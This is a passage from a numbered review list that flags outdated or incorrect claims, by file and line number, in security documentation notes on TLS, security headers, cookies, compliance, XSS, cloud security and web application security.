4. `Transport Layer Security.md` 35: handshake described as RSA key transport (removed in TLS 1.3); 65: EV shown in address bar (removed 2019).
5. `Security Headers.md` 68-82: CORP section is actually SOP/CORS and says CORP grants cross-origin reads; 45: `ALLOW-FROM` presented as usable; 6: `Blocked` value.
6. `Security Cookies.md` 21 and 53: 4 KB "all cookies, truncated" and SameSite "origin"-bound; file was committed in 2025 with 2009 facts.
7. `Compliance.md` 28 (SOC definitions), 32 (PCI SSL date 2016 vs 2018), 44/49 (EES, DSA still listed), 68 (TLS 1.0 acceptable).
8. `Cross Site Scripting.md` 24: non-working `javascript.alert` img payload; 13: input validation framed as the primary fix.
9. `Cloud Security.md` 7: NIST CSF conflated with SP 800-53 controls; 65/69: contradictory Prowler/Scout2 "superior" claims.
10. `Web Application Security.md` 111 and 138/141: Python and Log4Shell snippets are syntactically broken.
